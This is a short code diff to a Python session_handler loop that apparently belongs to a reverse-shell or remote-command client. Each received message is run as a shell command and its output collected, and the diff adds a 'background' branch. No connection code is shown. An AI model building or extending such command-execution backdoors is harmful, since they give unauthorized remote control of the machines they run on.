@@ -25,6 +25,8 @@ def session_handler():
             except FileNotFoundError:
                 outboud('Invalid directory.  Try again.')
                 continue
+        elif message == 'background':
+            pass
         else:
             command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             output = command.stdout.read() + command.stderr.read()
